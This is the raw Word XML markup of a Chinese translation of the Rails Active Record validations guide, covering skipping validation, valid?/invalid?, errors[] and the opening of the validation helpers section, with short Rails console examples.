    <w:p w14:paraId="760EE5D9"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2.3 跳过校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3494B35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87DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>下列方法将跳过校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，无论对象是否有效，都将把对象保存到数据库中去。所以必须谨慎使用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B0CDAC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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decrement!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CF1ABF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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decrement_counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7841F45D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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increment!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154891F8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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increment_counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C148614" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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toggle!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A685C78" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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touch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B05210" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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update_all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37493449" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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update_attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E67B3C2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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update_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B67C7C8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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update_counters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1768273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需要注意的是，</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">当将 </w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:validate =&gt; false</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为参数传递给save方法时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>save</w:t>
      </w:r>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也可以略过校验。</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>但也请谨慎使用这个技巧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B61200" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="00287DD1" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00287DD1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>save(:validate =&gt; false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DD3E61"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2.4 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>invalid?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AEC17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Rails 内部</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法用来验证对象是否有效</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。你也可以直接使用此方法。</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会触发所有的校验，当没有检查到任何错误时返回 true，否则返回 false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">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6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7ED223B9" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="553FDA5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0DA8816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:name,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1479ADB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1B0A99D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00BC2B0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Person.create(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
            <w:r w:rsidRPr="00197F86">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>.valid?</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DCAF97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Person.create(:name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; nil).valid? # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5EB16A6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执行完校验后，所有检查到的错误可以通过调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法获取到，它会返回所有错误的集合。因此，如果一个对象在运行完校验后这个错误集合为空，我们就可以认为这个对象是有效的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574C483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需要注意的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来实例化一个对象不会报告任何错误</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，即使这个对象从技术上来讲确实是无效的。因为调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="00197F86">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法并不会运行校验</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="581733DE" w14:textId="77777777" w:rsidTr="00283464">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="247C1CE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486ECF5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:name,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5E14561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4D38111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AF3890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p = Person.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BDD835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#&lt;Person id: nil, name: nil&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C03EBA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p.errors</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D736FA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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55FBF73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p.valid?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E48F6A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false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="102BBC3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p.errors</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78E139E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{:name=&gt;["can't be blank"]}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7376AF7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2B36B87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p = Person.create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D4F31F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#&lt;Person id: nil, name: nil&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="123C222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p.errors</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27F6005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{:name=&gt;["can't be blank"]}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2378C85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6BAAF2F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p.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1838F35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false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BDCD84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4261FD0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p.save!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4435ACB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ActiveRecord::RecordInvalid: Validation failed: Name can't be blank</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A2FF63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D069BD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Person.create!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01954F7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ActiveRecord::RecordInvalid: Validation failed: Name can't be blank</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0D2DB41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83464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>invalid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00283464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 仅仅是 </w:t>
      </w:r>
      <w:r w:rsidRPr="00283464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00283464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的反意词</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00283464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>invlaid?</w:t>
      </w:r>
      <w:r w:rsidRPr="00283464">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会触发校验，当检查到任何错误时返回 true，否则返回 false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D631054"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2.5 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7639E9"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为了验证对象特定的属性是否有效，你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors[:attribute]</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。它将返回属性 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:attribute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的所有错误。如果这个属性没有任何错误，将返回一个空数组。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E987FD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这个方法只能在校验_执行后_使用，因为他只是检查并返回错误集合中的值，并不会触发校验。这不同与前面介绍的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>invalid?+ 方法，因为他不会验证对象作为一个整体时的有效性。它只是检查对于对象特定的属性是否已经检查到错误。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5944"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="00B36B7A" w14:paraId="4F2DCD30" w14:textId="77777777" w:rsidTr="00B36B7A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5944" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B6DB0B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6A21A40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:name,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279DFC3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72E12D0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438A6DF1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="00B36B7A" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B36B7A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&gt;&gt; Person.new.errors[:name].any? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30A89A22" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B36B7A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&gt;&gt; Person.create.errors[:name].any? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B25852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在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId199" w:anchor="working_with_validation_errors-errors" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Working with Validation Errors</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 章节中，我们将对校验的验错误信息讨论地更深入一些。但现在，先让我们来看看 Rails 内建的校验 helpers。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5972E7E9"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3 Validation Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2837CA4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Active Record 提供了很多预定义好的校验 helper，你可以直接拿来使用到你的类声明中。这些 helper 方法提供了很多常用的校验规则。而一旦有校验失败，一个和被校验属性关联的错误信息会被添加到对象的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F590B6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每个 helper 可接受的属性名称数目不限，这意味着我们可以通过一行代码为多个属性添加同一类型的校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1617F61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BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">所有的 helper 方法都可以指定 </w:t>
      </w:r>
